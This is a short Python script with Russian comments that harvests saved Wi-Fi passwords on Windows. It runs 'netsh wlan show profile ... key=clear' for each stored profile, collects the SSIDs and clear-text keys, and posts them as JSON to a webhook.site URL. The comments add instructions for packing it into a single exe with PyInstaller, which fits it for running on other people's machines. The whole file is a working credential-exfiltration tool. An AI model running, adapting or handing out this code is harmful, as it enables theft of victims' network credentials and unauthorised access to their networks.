"""Загрузка всех паролей от wi_fi на русской Windows"""
# для формирования exe используй pyinstaller. Свободный сайт https://webhook.site/
# команда для запуска python -m PyInstaller --onefile .\app.py

import subprocess
import re
import requests
import json

print('Начало работы скрипта')
command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode('cp866')

profile_names = (re.findall("Все профили пользователей     : (.*)\r", command_output))
print(f'Профайлов получено: {profile_names.__len__()}')

wifi_list = []

if len(profile_names) != 0:
    for name in profile_names:
        wifi_profile = {}
        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output=True).stdout.decode(
            'cp866')
        if re.search("Ключ безопасности:       Отсутствует", profile_info):
            continue
        else:
            wifi_profile["ssid"] = name
            profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"],
                                               capture_output=True).stdout.decode('cp866')
            password = re.search("Содержимое ключа            : (.*)\r", profile_info_pass)
            if password == None:
                wifi_profile["password"] = None
            else:
                wifi_profile["password"] = password[1]
            wifi_list.append(wifi_profile)

url = 'https://webhook.site/cff51db1-556c-4973-bd80-dd6c37df4b59'

requests.post(url, json=json.dumps(wifi_list))

    
